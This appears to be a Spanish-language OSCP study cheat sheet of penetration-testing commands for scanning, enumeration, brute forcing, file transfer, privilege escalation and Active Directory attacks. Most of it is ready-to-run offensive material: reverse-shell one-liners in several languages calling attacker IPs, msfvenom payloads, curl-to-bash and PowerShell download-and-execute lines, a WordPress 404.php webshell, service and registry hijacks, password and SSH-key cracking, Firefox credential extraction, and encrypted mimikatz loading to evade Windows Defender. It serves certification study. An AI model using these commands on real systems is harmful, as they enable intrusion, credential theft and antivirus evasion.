# OSCP_resumen
Info sobre certificacion OSCP 
# Escaneo de puertos
https://github.com/Tib3rius/AutoRecon

## NMAP 
### 3nmaps inicial, full y udp en paralelo

nmap -sV -O --top-ports 50 --open -oA nmap/inicial <ip>
nmap -sC -sV -O --open -p -oA nmap/full <ip>
nmap -sU -p- -oA nmap/udp <ip>

nmap --scripts vuln,safe,discovery -p 443,80 <ip>

Inhabilitado el ping icmp
nmap -Pn --top-ports50 --open -oA nmap/inicial <ip>

Completo
sudo nmap -sC -sV -O --open -p- -oA fullnmap 10.10.147.59


### NMAP TCP rapido
nmap -Pn -v -sS -sV -sC -oN tcp-quick.nmap <ip>
### NMAP TCP Full
nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oN tcp-full.nmap -sV <ip>
### NMAP UDP rapido
- nmap -Pn -v -sU --top-ports=30 -oN udp-quick.nmap <ip>
- nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T4 -oN udp-1000.nmap <ip>
### output
- nmap -sV <ip> -o archivo.txt
### Completo agresivo
- nmap -p- --open -T5 -v -oG allPorts <ip victima> -n 
### NMAP con scripts
- grep -r categories /usr/share/nmap/scripts/*.nse |grep -oP '".*?"' |sort -u  #muestra las categorias de scripts
### SMB
- nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip victima>
- nmap --script "vuln" <ip> #busca categoria vulnerabilidad

## Servicios - ENUMERACION

SMB
smbclient -L //<ip/path> -I <ip>    #lista todos los discos compartidos en base a samba
python3 /usr/share/doc/python3-impacket/examples/smbclient.py -no-pass Usuario@ip   #interactuamos como ftp en samba GET y PUT ideal para subir shells
python3 /usr/share/doc/python3-impacket/examples/smbclient.py -no-pass x.x.x.x

Traspasar archivos desde Windows a Linux
sudo impacket-smbserver smbFolder $(pwd) -smb2support


smbclient -L \\\\<ip>\\<path> -N

### ProFtd 1.3.5
- Vector "mod_copy"
* Implementa SITE CPFR y SITE CPTO  comandos por el cual pueden usarse para copiar archivos y directorios a otra ubicacion del servidor. Un usuario no -autenticado puede ejecutar esos comandos para copiar cualquier archivos del filesystem a  otra ubicacion determinada.
### VsFtpd 2.3.4 

### FTP Puerto 21
-Checkear:
* version vulnerable
* Anonymous login
* Read access
* Web root or directorios root de de otro servicio accesible
* Acceso a la escritura

### SSH Puerto 22
- Checkear:
* version vulnerable
* Enumeracion de usuarios
* Host keys vistos en otro lado
* Si muestra una contraseña significa que es accedido por varios usuarios
* nmap -sV --script=hostkey -p22 <ip>
* Bruteforce con CeWL, Hydra, Patator, Crowbar

##Bruteforce con hydra
hydra -l usuario -P ./passwords <ip> -t 4 ssh
conectar con id_rsa
ssh -i id_rsa usuario@<ip> -N
o tambien 
--Si figura shell restricted
ssh <usuario>@<ip> -t "bash --noprofile"  || o tambien ssh username@IP -t “/bin/sh” or “/bin/bash” tambien || ssh username@IP -t “() { :; }; /bin/bash” (Shellshock)


### Netcat
* connectar #nc <ip> <puerto>
* recibir conexion #nc -nlvp <puerto>

###SOCAT 
*recibir conexion #socat TCP4-LISTEN:<puerto>,reuseaddr,fork 'SYSTEM:/bin/bash'      (igual a nc -nlvp)


### TELNET Puerto 23
* telnet <ip> <puerto>

### SMTP Puerto 25
-Checkear:
* version vulnerable con HELO/HELLO
* conectar con telnet y probar $helo <ip/localhost>

### POP Puerto 110
* conectar usando telnet
* $telnet dominiomail 110
 user <usuario>
 pass <contraseña>
* LIST - lista de mails
* STAT - estado de buzón
* RETR <numero email>
* TOP nn nl  nn=numero de mensaje, nl numero de lineas de cabecera
* DELE <numero> borra el mensaje al teminar la sesion
* QUIT
 
### DNS Puerto 53
Probable indicador de controlador de dominios de Windows
- Checkear zone transfer

### Kerberos Puerto 88
Kerberos is a network authentication protocol that works on the principle of issuing tickets to nodes to allow access based on privilege level.

Probable indicador de controlador de dominios 'DC'

script para enumerar usuarios
/dist/kerbrute_linux_amd64 userenum --dc spookysec.local -d spookysec.local ../userlist.txt -t 100
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/svc-admin -request -no-pass -dc-ip 10.10.237.245



### Netbios Puerto 139 
Netbios permite a las aplicaciones comunicarse dentro de una red Lan /Capa 5 del modelo OSI
nmlookup es usado para solicitudes de nombres NetBios y mapas de IPs sobre la red usando TCP/IP queries.
* $nmblookup -A <ip>
* $nbtscan <ip>

### RCP Puerto 135
* $sudo nmap -sS -Pn -sV --script=rcpinfo.nse -p135 0
* rpcinfo <ip>
* rpcclient -U "" -N [ip]  //U nombre de usuario vacio y -N no requerir password

### LDAP Puertos 389,636,3268,326
* nmap -sS -Pn -sV --script=ldap* -p389,636,3268,3269


### SMB Puertos 139 445
- nmap -Pn --scrip=smb-proto* -p139,445
- nmap -Pn --scrip=smb-os-discovery.nse -p139,445
- nmap -Pn --scrip=smb-enum* -p139,445
- nmap -Pn --scrip=smb-vuln* -p139,445
Banda de vulnerabilidades
- nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse
#### Checkear:
#### Null logins
- nmap --script smb-enum-shares -p 139,445
- smbclient -L \\\\ip\\ -N
- smbclient -m=SMB2 -L \\\\hostname\\ -N
#### Conectar a lo compartido con una sesion Nula (connect to a share with null sesion)
- smbclient \\\\ip\\$Admin -N
- smbmap -H <ip>
- smbmap -u DoesNotExists -H <ip>
#### enum4linux -a <ip>
#### Checkear permisos en share
- smb: \>showacls  #habilita acl listing
- smb: \>dir   #lista directorios con acls (access control lists)
#### Montar share en maquina local
- mount -t cifs //<ip>/Sharename ~/path/donde/mount_directorio
#### Listar share con credenciales
- smbmap -u Usuario -p Password -d dominio.ltd -H <ip victima>
#### Listar share con todos los archivos recursivamente
- smbmap -R -H <ip>
- smbmap -R Carpeta -H <ip>
- smbclient //<ip>/Carpeta
- smb: \> recurse ON
- smb: \> prompt OFF
- smb: \> mget *

##Interactual con smb CON usuario PEPITO
python3 /usr/share/doc/python3-impacket/examples/smbclient.py -no-pass Pepito@ip
#put enviar archivo
#get descargar archivo
-Posible transf de LFI a RCE mandando una shell ej .aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=53 -f aspx -o payload.aspx


#### Subir/Descargar archivos especificos
- smbmap -H <ip> --download 'Carpeta\file.htb'
- smbmap -H <ip> --upload test.txt Sharename/test.txt
 
### NFS Puerto 2049
- showmount -e <ip>
- mount -t nfs -o vers=3 <ip>:/home/ ~/home
- mount -t nfs4 -o proto=tcp,port=2049 127.0.0.1:/srv/Share mountpoint

### TFTPD Udp 69
- tftp client 
puede ser usado para leer archivos de sistema, MSSQL password desde un archivo mdf

### EXPLOITS
EDB y searchsploit
- checkear:
CVE detallado para RCE / LFI / RFI / SQLi 

### Searchsploit busca Pocs
searchsploit 'servicio y version'
searchsploit -m n°archivo    # crea un mirror del poc en cuestion copiandolo a la carpeta donde estemos



### Web Puerto 80/443
- nmap -Pn -sC -p80,443
-Checkear:
Navegador a la webapp
Usuarios y keywords
Web server vulnerabilidades
Cgi's shellshok
Certificados del hostname
robots.txt
Software conocido - Ver codigo fuente
Credenciales defaults
Input validation - SQLi
LFI / RFI

### Dirb
- $dirb <ip>
- $dirb -X extensiones .php,.asp,.txt,.jsp

### GOBUSTER
no instalado en kali2020

>apt install gobuster
simple
-  gobuster dir -u http://10.10.10.229 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x .php,.txt,.html,.cgi -s "200" -o file.txt
$gobuster -e -u <http://ip/path> -w /usr/share/wordlists/directory-list-lowercase-2.3-small.txt -t 40 -x .php,.txt,.html,.cgi -s "200" -o file.txt
gobuster -u http://$IP -w /opt/directory-list-2.3-medium.txt x php,sh,txt,cgi,html,js,css,py
- $Gobuster dir --url <ip> --wordlist /usr/share/seclist/Discovery/Web-Content/bit.txt
-e muestra ruta full de la URL
-x extension
-t threads
-s status -w wordlistpath

Similar:
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://10.10.207.250/inferno  #al hacer un get tira prompt de login

## Transferencia de archivos SMB
Montamos una carpeta temporal donde veremos lo que este en la carpeta compartida
##comandos
Linux a windows
Linux: 
- $mkdir ruta/Share
- $mount ipwindows:/rutaquecomparte /ruta/Share
- $ls -la /ruta/Share   #para ver los permisos de archivos y directorios

#Transferencia de archivos desde linux a windows
En kali: 
sudo python3 -m http.server 80
En windows
abrimos un navegador a la ruta <ip>:80

#Transferencia de archivos usando powershell
# 1
En kali python3 -m http.server 80
En windows $powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://<ip>/path/file.ps1');

# 2
En kali 
python3 -m http.server 80
En windows $powershell:
IEX(New-Object Net.WebClient).downloadString('http://<ip>/Invoke-SharpLoader.ps1')

Tambien
// powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')

#Transferencia de archivos desde windows 
En windows:
certutil.exe -urlcache -f http://10.0.0.5/file.exe namefile.exe   // certutil -urlcache -split -f "http://ip-addr:port/file" [output-file]
En Linux:
python3 -m http.server 80 (version anterior de python es python -m SimpleHTTPServer 80

#Transferencia de archivos de linux a linux
Maquina destino
cat > file < /dev/tcp/<ip_remota>/7777

Maquina archivo
nc -nlvp 7777 < archivo

#Transferencia de archivos Linux por WGET
wget http://ip-addr[:port]/file[-o output-file] 
Siempre y cuando exista o una url o un servidor 
wget ftp://ip/file.sh -o ftpfile.sh
wget ftp://ip/file.sh --ftp-user=root --ftp-password=pass123 -o ftpfile.sh

#Transferencia de archivos usando Curl
curl http://ip:8001/file.sh -o curlfile.sh

Traspasar archivos desde Windows a Linux SMB
Desde Linux
sudo impacket-smbserver smbFolder $(pwd) -smb2support

Desde Windows
explorer.exe ... \\<ip>\smbFolder


#Desde Kali a windows usando SMBServer
En kali
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
En windows
C:\Users\user>copy \\10.6.56.15\kali\shell1.exe C:\\PrivEsc\shell1_copy.exe

## Conexion a servicios
SMB carpetas compartidas por smb
- smbclient //<ip victima>/anonymous #usuario anonymous no requiere contraseña
- smbclient -l //10.10.58.241/ -I 10.10.58.241
 
RDP
rdesktop
rdesktop -u guest 10.10.129.180:3389

sudo apt install freerdp2-x11 freerdp2-shadow-x11
xfreerdp /u:usuario /p:password /v:ip /cert-ignore



## Reverse Shells

### Bash
> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
### Perl
> perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
### Python
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
### PHP
> php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
### Ruby 
> ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
### Netcat
> nc -e /bin/sh 10.0.0.1 1234
### Java
> r = Runtime.getRuntime()
> p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
> p.waitFor()
### Metasploit
- PHP > msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
- ASP > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
- ASPX > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.101 LPORT=53 -f aspx -o shell.aspx
- WAR > msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
- JSP > msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
- BASH > msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

- Windows Installer (MSI) > msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi 
Necesita ejecutarse con: msiexec /quiet /qn /i C:\PrivEsc\reverse.msi


##Puente entre rev shells
En maquina atacante(10.10.10.2)
1-modificamos rev_shell.py de pentesmonkey (ip y puerto 9000)
2-levantamos un servidor http en mismo path con python3 -m http.server 80
3-en otra ventana levantamos un nc -nlvp 9000

En maquina victima(10.10.10.1)
curl 10.10.10.2/rev_shell.py | python3
curl 10.10.10.2/rev_shell.sh | bash 

#Bad chars en rev_shell suponiendo q hay RCE pero no una shell
En maquina atacante
echo -n "bash -c 'bash -i >& /rev/tcp/10.10.10.2/9001 0>&1'" | base64
devolvera un hash en base64

En maquina victima
echo -n bashenbase64= | base64 -d |bash

### Spawning a TTY Shell

> python -c 'import pty; pty.spawn("/bin/sh")'
> echo os.system('/bin/bash')
> /bin/sh -i
> perl -e 'exec "/bin/sh";'
> perl: exec "/bin/sh";
> ruby: exec "/bin/sh"
> lua: os.execute('/bin/sh')
> exec "/bin/sh" (Desde IRB)
> :!bash (Desde vi)
> :set shell=/bin/bash:shell (Desde vi)
> !sh (Desde nmap)
> find /etc/passwd -exec /bin/bash ;

## PHP Avanzado + Windows
Si existe la posibilidad de upload
/usr/share/webshells/php/simple-backdoor.php  #Esto se usa en http://<ip>/path.php?cmd=comando o reverse.exe


## Compilado de Exploits para Windows
### Linux
- i686-w64-mingw32-gcc exploit.c -o exploit

### Windows de 32 bits
- i686-w64-mingw32-gcc exploit.c -o exploit -lws2_32


## Hydra – Brute Force Techniques
Basic Hydra usage
hydra <Username options> <Password options> <Options> <IP Address> <Protocol> -V -f

### SSH
hydra -L usernames.txt -P passwords.txt 192.168.2.66 ssh -V

### FTP
hydra -L usernames.txt -P passwords.txt 192.168.2.62 ftp -V -f

### SMB
hydra -L usernames.txt -P passwords.txt 192.168.2.66 smb -V -f

### MySQL
hydra -L usernames.txt -P passwords.txt 192.168.2.66 mysql -V -f
### VNC
hydra -P passwords.txt 192.168.2.62 vnc -V
Telnet
hydra -L usernames.txt -P passwords.txt 192.168.2.62 telnet -V

##APACHE 
#7.0 tomcat
/manager/html  > login
msfconsole |nohabilitado| use scanner/http/tomcat_mgr_login 
buscar manera de upload un archivo - msfvenom -p java/meterpreter/reverse_tcp lhost=x lport=x -f war > /path/archivo.war

##Windows General
#ms17 010
Eternal blue



## PIVOTING
usando sshuttle
atacante ------------>maquina1 misma red atacante --------------------->red interna maquina1 distinta red atacante
192.168.0.10             192.168.0.1                                     
                         10.10.2.1                                            10.10.2.3

atacante$sshuttle -r user@192.168.0.1 10.10.2.0/24
[local sudo] Password: password de maquina1(sudo asiq usuario con privilegios)


Shellcodes
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f c -b '\x00\x0a\x0d'
Powershell
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://10.11.0.41/nishang.ps1')\"" -f python -b '\x00\x0a\x0d'
Tambien es posible agregar al final
EXITFUNC=thread -e x86/shikata_ga_nai


Enumeracion de usuarios en varios servicios contra WINDOWS
enum4linux -a <ip>


hydra -t 4 -l username -P usrshare/wordlists/rockyou.txt ssh://<ip>

SSH 
ssh -i <path id_rsa> user@ip

Bruteforcing SSH con id_rsa>id_rsa.txt
Para conectarnos sin saber la pass es necesario tener id_rsa, id_rsa.pub y passphrase del usuario, puede estar dentro de un equipo local.

ssh2john crea un archivo hash de una llave id_rsa(clave privada de ssh)
python /usr/share/john/ssh2john.py id_rsa.txt > sshhash.txt 

encontramos una posible passphrase de id_rsa
john --wordlist=rockyou.txt sshhash.txt

#Teniendo shadow y passwd files (LFI)
guardamos los archivos en shadow_ y passwd_
Opcion 1) john --wordlist=/usr/share/wordlists/rockyou.txt shadow_file
Opcion 2)  unshadow PASSWORD-FILE SHADOW-FILE > unshadow_output.txt

cuando nos logueamos a otro usuarios
ssh -i /archivo_id_rsa usuario@ip 
nos va a preguntar la frase secreta obtenida con john


#Crackeo de cuentas en servicios

##John
Para crackear pass
john -w /rockyou file
prefijos:
prefix. "$2a$" or "$2b$" bcrypt//-   john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash 

#Wordpress
##Hydra haciendo antes un curl para obtener parametro usuario, pass, submit
hydra -L /usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt -P /usr/share/wordlists/rockyou.txt 10.10.107.13 -V http-form-post '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
##wpscan
wpscan --url http://internal.thm/blog -e u
wpscan --url http://spectra.htb/main --detection-mode aggressive -e ap -o wpscan
wpscan --url http://bla/main --plugins-detection aggressive -e ap -o wpscan2

#Obtener una shell
#Modif de plugins o temas en 404.php o algun archivo que no sea critico
Agregar en primera linea
<? system($_REQUEST['variable']); ?>
http:/<url>/wp-content/themes/eltemaqsea/404.php?variable=whoami   <RCE
bash+-c+'bash+-i+>%26+/dev/tcp/<ipatacante>/<pto>%261'       (variable=bash -c 'bash -i >& /dev/tcp/<ip>/<pto> 0>&1' con urlencoding)
#Burp 
Usando el proxy
Podemos probar cualquier comando para php revershell y haciendo un get a esa url con burp activado (Send)
 

#Otro codigo para reverse_shell 
/usr/share/laudanum/php/php-reverse-shell.php (pentestmonkey-php)
modificando ip y url 
agregandola al principio del 404.php


#Misc a shell
si url muestra error establishing a database connection
Ver en codigo fuente "error page wp-die-message" es un error de wordpress

copiar al clipboard 
cat php-reverse-shell.php | xclip -selection clipboard


PIVOTING
usando sshuttle
atacante ------------>maquina1 misma red atacante --------------------->red interna maquina1 distinta red atacante
192.168.0.10             192.168.0.1                                     
                         10.10.2.1                                            10.10.2.3

atacante$sshuttle -r user@192.168.0.1 10.10.2.0/24
[local sudo] Password: password de maquina1(sudo asiq usuario con privilegios)

## WEB
Hydra contra PHP login-brute-force
hydra -l admin -P usrshare/wordlists/rockyou.txt -s 80 f <ip> http-get /infernoqseriaeldirectoriologin
## Buscar directorios en la url
apt install gobuster simple

> gobuster dir -u http://<ip-path> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ./file.txt
> gobuster -e -u http://ip/path -w /usr/share/wordlists/directory-list-lowercase-2.3-small.txt -t 40 -x .php,.txt,.html,.cgi -s "200" -o file.txt
> gobuster dir --url --wordlist /usr/share/seclist/Discovery/Web-Content/bit.txt -e muestra ruta full de la URL -x extension -t threads -s status -w wordlistpath

 
## Reporte
https://github.com/Snifer/Pentester-Academy-Markdown-Template


## Priv Escalation Escalada de privilegios
LINUX

binarios+Find+GTFObins
find / -perm -u=s -type f 2>/dev/null |grep -E "/aria2c|/arp|/ash|/base32|/base64|/bash|/busybox|/cat|/chmod|/chown|/chroot|/cp|/csh|/curl|/cut|/dash|/date|/dd|/dialog|/diff|/dmsetup|/docker|/emacs|/env|/eqn|/expand|/expect|/file|/find|/flock|/fmt|/fold|/gdb|/gimp|/grep|/gtester|/hd|/head|/hexdump|/highlight|/iconv|/ionice|/ip|/jjs|/jq|/jrunscript|/ksh|/ksshell|/ld.so|/less|/logsave|/look|/lwp-download|/lwp-request|/make|/more|/mv|/nano|/nice|/nl|/node|/nohup|/od|/openssl|/perl|/pg|/php|/pico|/python|/readelf|/restic|/rlwrap|/rpm|/rpmquery|/rsync|/run-parts|/rvim|/sed|/setarch|/shuf|/soelim|/sort|/start-stop-deamon|/stdbuf|/strace|/strings|/systemctl|/tac|/tail|/taskset|/tclsh|/tee|/tftp|/time|/timeout|/ul|/unexpand|/uniq|/unshare|/uudecode|/uuencode|/vim|/watch|/wget|/xargs|/xxd|/zsh|/zsoelim"


##nmap available on versions 2.02 to 5.21
nmap --interactive
#>sh!

##binarios linux
Si podemos ejecutar con permiso de root  (sudo -l)
ejecutamos iftop
!/bin/sh   #signo d exclamacion para introducir comando



##Busqueda de ejecutables por root
find / -type f -perm 4000 2>/dev/null
/usr/bin/python 
python https://gtfobins.github.io/gtfobins/python/#suid
$python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

##Metodos de elevasion de privilegio en WINDOWS 10
#Elevasion de privilegios Windows
reg query HKCU/SOFTWARE/Policies/Microsoft/Windows/Installer /v AlwaysInstalledElevated
reg query HKLM/SOFTWARE/Policies/Microsoft/Windows/Installer /v AlwaysInstalledElevated
Si esto presenta 0x1 de resultado podemos ejecutar un instalable con acceso administrador
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X.X.X.X LPORT=9999 -f msi -o reverse.msi

Teniendo una shell comun ejecutamos
msiexec /quiet /qn /i C:\<path>\reverse.msi

---------------------
#SERVICE EXPLOITS - Permisos de servicio inseguros
Necesitamos accesschk.exe -herramienta de windows oficial
accesschk.exe /accepteula -uwcqv <usuario> <servicio>    
sc qc <servicio>  # Nos muestra que ejecuta con privilegios SYSTEM 

CONDICIONAL - METODOLOGIA 

"Insecure Service Permissions
Si accesschk.exe /accepteula -uwcqv <usuario> <servicio> #Nos muestra los permisos Si SERVICE_CHANGE_CONFIG habilitado
Si sc qc <servicio> #Nos muestra SERVICE_START_NAME 
Podemos modificar la configuracion y setear BINARY_PATH_NAME(binpath) a un reverse.exe
sc config <servicio> binpath="\"C:\ruta\reverse.exe\""
net start <servicio>

"Unquoted service path"
Si accesschk.exe /accepteula -uwcqv <user/system> <servicio> #Nos muestra RW C:\Program Files\Unquoted Path Service\ permisos de escritura
Si sc qc <servicio> # Nos muestra el binary_path_name con una ruta pero sin comillas podemos explotar la literalidad de la ruta
ejemplo 
C:\Program Files\Unquoted Path Service\Common Files\servicio.exe 
C:\Program Files\Unquoted Path Service\Common.exe    #Windows va a buscar en esa ruta el ejecutable antes de la ruta completa
cp reverse.exe C:\Program Files\Unquoted Path Service\Common.exe
net start <servicio>

"Weak Registry Permissions"
sc qc <servicio>  #vemos la propiedad SERVICE_START_NAME  LocalSystem
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<servicio_reg>  #Vemos propiedad ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\path\reverse.exe /f #sobreescribimos el registro de la imagenpath hacia nuestra reverse.exe
net start regsvc



##Vector contraseñas en firefox

utilizamos https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py
Necesitamos tener todos los archivos del perfil
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\
luego ejecutamos
python3 firefox_decrypt.py ./ 
Obteniendo el usuario y contraseña guardada.


### sudo (2020)
- $sudoedit -s '\99999999999999999999999999999999999999'
  malloc() error = vulnerable
  
## Vector sudo -l

* $find / -perm -4000 -user root -type f -print >>suid.txt #busca archivos con permiso root
* $find / -type f -name especifictxt.txt
* la entrada /usr/bin/sudo significa q se puede explotar sudo 
* $/usr/bin/bash -p

## Vector systemctl (local) https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
dentro del equipo conectado

$TF=$(mktemp).service
$echo '[Service]
>Type=oneshot
>ExecStart=/bin/sh -c "chmod +s /bin/bash"
>[Install]
>WantedBy=multi-user.target' > $TF

$systemctl link $TF
$systemctl enable --now $TF

Para explotar la shell
bash -p
#id
root

## Vector programa local con privilegios root

La maquina KENOBI de TryHackme plantea una escalada de privilegios sobre un programa menu el cual ejecuta un "curl -I localhost"
lo encontramos gracias al programa find el cual busca los archivos con privilegio de root y no muestra el error en la busqueda
find / -perm -u=s -type f 2>/dev/null     
find / -perm -4000 -user root -type f -print >>suid.txt

si ejecutamos
echo /bin/bash > curl    
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu      //donde se ejecuta el programa
pisamos el comando curl del menu por lo que el menu ahora ejecutará /bin/bash en modo root

WINDOWS

## Windows Exploit Suggester /wesng (es necesario saber systeminfo en la maquina)
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
python3 windows-exploit-suggester.py --update
python3 windows-exploit-suggester.py --database <fecha>-mssb.xls --systeminfo systeminfo.txt

## WESNG
git clone https://github.com/bitsadmin/wesng (es necesario saber systeminfo en la maquina)
python3 wes.py --update
python3 wes.py systeminfo.txt -i "Elevation of Privilege" || ej busq de elevacion.

##Vector acceso en un windows y whoami /priv muestra habilitado SeImpersonatePrivilege
descargar https://github.com/itm4n/PrintSpoofer/releases
$PrintSpoofer.exe -i -c cmd / o tambien PrintSpoofer.exe -c "c:\Temp\nc.exe ip pto -e cmd"  


##Binarios en windows CVE "microsoft"
github.com/WindowsExploits/Exploits


https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1
Busca parches de seguridad y malas configuraciones de aplicaciones y servicios - tiene q ser ejecutado localmente.


##Vector Windows usuario con priv seimpersonateprivilege
whoami /priv
seimpersonateprivilege Enable
descargar binario https://github.com/itm4n/PrintSpoofer/releases
luego pasarlo a la maquina victima
>.\PrintSpoofer64.exe -i -c cmd.exe
system>



## Shells interactivas
python -c 'import pty; pty.spawn("/bin/bash")'   // python3 -c 'import pty;pty.spawn("/bin/bash")' 

Para usar el "clear" si no funciona
export TERM=screen-256color
Para usar el control+C 
echo $TERM
stty raw -echo
fg 
export TERM=screen

Si existe SOCAT
listener
socat file:'tty, raw,echo=0 tcp-listen:4444

victima
socat exec:'bash -li', pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444

---En python3
En Shell no interactiva
python3 -c 'import pty;pty.spawn("/bin/bash")'
Control+Z

En Maquina Local
stty raw -echo
fg enter (nc -lvnp <puerto>)
fg enter (comando ejecutado anteriormente en la maquina victima)

En Shell ya interactiva
export TERM=xterm



Descargando binarios desde 3ros
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444


Using stty options

### In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

### In Kali
$ stty raw -echo
$ fg

### In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>

##Mysql
rutas importantes
password data
database_settins.inc.php
config.inc.php

Uso
mysql -u user -p XXXX
$show databases
use data_base
show tables
describe tablas
select id, username, passwd from users

#Active Directory

enum4linux -s <ip> #obtiene el SID del dominio de la ip


./kerbrute userenum --dc dominio.local -d dominio <user_list.txt> -t 100




# EXTRAS
Windows
Saber usuarios conectados en el equipo 
qwinsta /SERVER:nombredelequipo
Para sacar usuarios conectados en el equipo ej usuario llamado 'rdp-tcp#0'
rwinsta tdp-tcp#0 /SERVER:nombreequpo
5rtg

#Ejecucion encryptada de mimikatz Windows Defender Bypass
git clone https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader   (sharpencrypt para encriptar mimikatz / sharploader correr en memoria)
Encriptar:
Invoke-SharpEncrypt -file C:\CSharpFiles\SafetyKatz.exe -password S3cur3Th1sSh1t -outfile C:\CSharpEncrypted\SafetyKatz.enc
Invoke-SharpEncrypt -file <pathfile>mimikatz.exe -password loquesea -outfile safetykatz.enc

Cargar desde URL
Invoke-SharpLoader -location https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-SharpLoader/master/EncryptedCSharp/SafetyKatz.enc -password S3cur3Th1sSh1t -noArgs
Invoke-SharpLoader -location https://10.10.10.10/SafetyKatz.enc -password loquesea -argument privilege:debug -argument2 sekurlsa::logonPasswords

Cargar desde disco
Invoke-SharpLoader -location C:\EncryptedCSharp\Rubeus.enc -password S3cur3Th1sSh1t -argument kerberoast -argument2 "/format:hashcat"


#Informacion de conexiones (Jekyll)
lsof -i  (list open files /conexiones...)
ps -eL  (L: show threads, e: process id)


MATERIAL QUE POSIBLEMENTE SE PUEDA UTILIZAR
https://github.com/SecWiki/windows-kernel-exploits


#EDAD DE PIEDRA:
Hacer ping con bat a una red entera 
Windows
ejecutar en cmd con priv de admin
FOR /L %i IN (1,1,254) DO ping -n 1 192.168.1.%i | FIND /i "Reply"
Linux
ejecutar en terminal
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; done
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip;done |grep ttl   - te filtra solo ips encontradas (podria mejorarse)




#Virtualbox - info de maquinas ip,memoria,etc
C:program files\virtualbox>$VBoxManage.exe guestproperty enumerate <Maquina>



Informacion del equipo
Windows
MEMORIA RAM
wmic memorychip 

wmic memorychip get banklabel, capacity, memorytype, typedetail, speed, manufacturer


Referencias:
https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
https://github.com/evets007/OSCP-Prep-cheatsheet/blob/master/linux-privesc.md
Template para el reporte
https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
https://github.com/Snifer/Pentesting-Mobile
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil
https://www.tiraniddo.dev/
https://ceso.github.io/posts/2021/03/my-videos/#simulation-of-oscp-with-hack-the-box-and-vulnhub-machines
https://jieliau.medium.com/escalate-yourself-on-windows-platform-885acd2a51ce
https://github.com/BankSecurity/Red_Team/blob/master/Persistence/All_Techniques.txt
https://www.tagnull.de/post/oscp-reporting/
